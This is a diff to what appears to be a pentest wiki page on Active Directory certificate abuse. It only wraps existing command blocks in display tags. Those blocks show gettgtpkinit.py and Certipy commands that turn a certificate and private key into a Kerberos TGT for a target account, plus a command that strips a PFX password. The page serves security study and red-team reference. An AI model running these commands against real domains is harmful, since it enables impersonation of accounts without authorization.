@@ -21,6 +21,7 @@ The "certificate + private key" pair is usually used in the following manner
 {% tab title="UNIX-like" %}
 From UNIX-like systems, [Dirk-jan](https://twitter.com/\_dirkjan)'s [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py) from [PKINITtools](https://github.com/dirkjanm/PKINITtools/) tool to request a TGT (Ticket Granting Ticket) for the target object. That tool supports the use of the certificate in multiple forms.
 
+{% code overflow="wrap" %}
 ```python
 # PFX certificate (file) + password (string, optionnal)
 gettgtpkinit.py -cert-pfx "PATH_TO_PFX_CERT" -pfx-pass "CERT_PASSWORD" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
@@ -31,18 +32,23 @@ gettgtpkinit.py -pfx-base64 $(cat "PATH_TO_B64_PFX_CERT") "FQDN_DOMAIN/TARGET_SA
 # PEM certificate (file) + PEM private key (file)
 gettgtpkinit.py -cert-pem "PATH_TO_PEM_CERT" -key-pem "PATH_TO_PEM_KEY" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
 ```
+{% endcode %}
 
 Alternatively, [Certipy](https://github.com/ly4k/Certipy) (Python) can be used for the same purpose.
 
+{% code overflow="wrap" %}
 ```bash
 certipy auth -pfx "PATH_TO_PFX_CERT" -dc-ip 'dc-ip' -username 'user' -domain 'domain'
 ```
+{% endcode %}
 
 Certipy's commands don't support PFXs with password. The following command can be used to "unprotect" a PFX file.
 
+{% code overflow="wrap" %}
 ```bash
 certipy cert -export -pfx "PATH_TO_PFX_CERT" -password "CERT_PASSWORD" -out "unprotected.pfx"
 ```
+{% endcode %}
 
 The ticket obtained can then be used to
 
